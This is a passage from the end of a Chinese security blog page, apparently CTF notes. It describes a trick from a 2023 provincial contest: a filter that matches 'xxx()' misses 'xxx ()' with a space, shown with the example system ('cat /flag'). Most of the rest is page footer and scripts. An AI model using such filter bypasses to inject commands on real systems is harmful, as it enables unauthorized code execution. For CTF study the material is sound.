+  <a href="#other-tricks" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>2023陕西省赛一个题匹配了xxx()这种形式，实际上xxx ()也是可以执行的</p>
+<p>例如 system (&lsquo;cat /flag&rsquo;);</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-tag" title="Tags - 命令执行">命令执行</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/62/" class="post-nav-item" rel="prev" title="内网渗透常用命令"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>内网渗透常用命令</a>
+      <a href="/posts/owasp/xxe/128/" class="post-nav-item" rel="next" title="XXE-姿势">XXE-姿势<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
